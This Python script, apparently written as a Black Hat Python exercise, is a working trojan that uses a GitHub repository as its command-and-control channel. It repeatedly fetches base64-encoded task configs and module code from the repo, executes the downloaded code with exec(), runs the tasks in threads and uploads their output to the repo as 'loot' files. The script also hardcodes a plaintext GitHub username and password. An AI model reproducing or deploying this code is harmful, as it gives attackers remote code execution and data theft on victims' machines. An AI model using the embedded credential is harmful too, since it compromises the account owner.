#!/usr/bin/python3
import sys, os, imp
import datetime, random
import threading, queue
import base64

from time import sleep
from simplejson import loads
from github3 import login


ID="test"
GIT_URL="http://github.com/iwakura1ain/BlackHatPython-Examples"
MODULE_URL="/home/dks/Development/Python/blackhat-python"

CONFIG_DIR="trojan_command/config/trojan_conf.json"
CONFIG=[]

LOOT_DIR="trojan_command/loot"
LOOT_NUM = 1

MODULE_DIR="trojan_command/modules"
TROJAN_MODULES=[]


class Importer():
    def __init__(self):
        self.current_module_code = ""

    def FindModule(self, name, path=None):
        new_module_code = base64.b64decode(GetFile(path + "/" + name + ".py"))
        #new_module_code = ReadFile(path + "/" + name + ".py")

        return self.VerifyModule(new_module_code)

    def VerifyModule(self, new_module_code):  #TODO: implement code checking
        if new_module_code is not None:
            self.current_module_code = new_module_code
            print(new_module_code)
            return True
        else:
            return False        

    def LoadModule(self, name):
        module = imp.new_module(name)
        exec(self.current_module_code, module.__dict__)
        sys.modules[name] = module        

class Task(object):
    def __init__(self, task_name, task_args):
        self.task_name = task_name
        self.task_flags = [False,False,False]
        self.task_args = task_args
        self.task_thread = None

    def __hash__(self):
        return hash((self.task_name, "".join(self.task_args) ))

    def __eq__(self, other):
        if not isinstance(other, type(self)):
            return False

        return (self.task_name == other.task_name) and (self.task_args == other.task_args) #and (self.task_thread == other.task_thread)

    def __contains__(self, other):
        flag = False
        for task_instance in other:
            if(self == task_instance):
                return True

        return False              

    def InitThread(self):
        self.task_thread = threading.Thread(target=RunModule, args=(self.task_name, self.task_args, self.task_flags,))
            
class TaskSyncer:
    def __init__(self):
        self.running_tasks = set()

    def SyncTasks(self, requested_tasks): #scheduled_tasks -> list of dicts
        new_tasks = set()

        for old_task in self.running_tasks:
            if old_task in requested_tasks:
                new_tasks.add(old_task)
                print("Same task requested...")
            else:
                try:
                    print("Trying to exit task...")
                    old_task.task_flags[1] = True #flag to kill task
                except:
                    print("Task already exited...")
                    continue                    

        for task in requested_tasks:
            new_tasks.add(task)

        for tasks in new_tasks:
            tasks.InitThread()
        
        self.running_tasks = new_tasks
        print("New taskset initialized!")

    def RunAll(self):
        print("Starting new taskset!")
        for task in self.running_tasks:
            if task.task_flags[0]:
                continue
            else:
                task.task_flags[0] = True
                task.task_thread.start()
                
def ReadFile(dir):
    f = open(dir, "r")
    s = f.read()
    f.close()

    return s
            
def RunModule(module, args, flags):
    print("Running module: %s" % module)
    result = sys.modules[module].run(args, flags)
    StoreLoot("\n" + module + ": " + result + "\n")
    return
        
def ConnectToGithub():
    print("Connecting to github...")
    gh = login(username="iwakura1ain", password="912ehd406gh")
    repo = gh.repository("iwakura1ain", "BlackHatPython-Examples")
    #branch = repo.branch("main")

    return gh,repo

def GetFile(dir):
    gh, repo  = ConnectToGithub()
    print("Downloading: %s" % dir)
    f = repo.file_contents(dir)

    return f.content

def GetConfig():
    global CONFIG
    
    importer = Importer()
    scheduled_tasks = []

    while True:
        print("Attempting to receive taskset...")
        
        config = loads(base64.b64decode(GetFile(CONFIG_DIR))) #simplejson, base64 used
        #config = loads(ReadFile("/home/dks/Development/Python/blackhat-python/" + CONFIG_DIR))
        if(CONFIG != config):
            CONFIG = config
            print("New taskset received!")
            
            for task in CONFIG:
                mod = task["module"]
                args = task["args"]
                
                if(mod not in TROJAN_MODULES):
                    print("Requires module import...")
                    if importer.FindModule(mod, MODULE_DIR):
                        importer.LoadModule(mod)
                        TROJAN_MODULES.append(mod)
                                                
                    else:
                        print("Module not found...")
                        continue
                
                new_task = Task(task["module"], task["args"])
                scheduled_tasks.append(new_task)
                    
            return scheduled_tasks

        else:
            print("No new task added...")

        sleep(random.randint(15,20))
            
def StoreLoot(loot):
    global LOOT_NUM

    gh, repo = ConnectToGithub()
    remote_path = "%s/%d-%s.txt" % (LOOT_DIR, LOOT_NUM, "testing")
    print("Storing the loot to %s" % remote_path)
    
    #remote_path = "%s/%d-%s.txt" % (LOOT_DIR, LOOT_NUM, datetime.time.strftime("%H%M"))
    #repo.create_file(remote_path, datetime.date.strftime("%Y-%m-%d"), base64.b64encode(loot))
    #repo.create_file( remote_path, "testing...", base64.b64encode(loot.encode("utf-8")) )
    repo.create_file( remote_path, "testing...", loot.encode("utf-8") )
    LOOT_NUM += 1

    return

def main():
    running_modules = TaskSyncer()
    
    while True:
        requested_tasks = GetConfig() #retries randomly until new config is loaded
        running_modules.SyncTasks(requested_tasks) 
        running_modules.RunAll()
        
        
    
    
    
if __name__=="__main__":
    main()
    
                
        

    
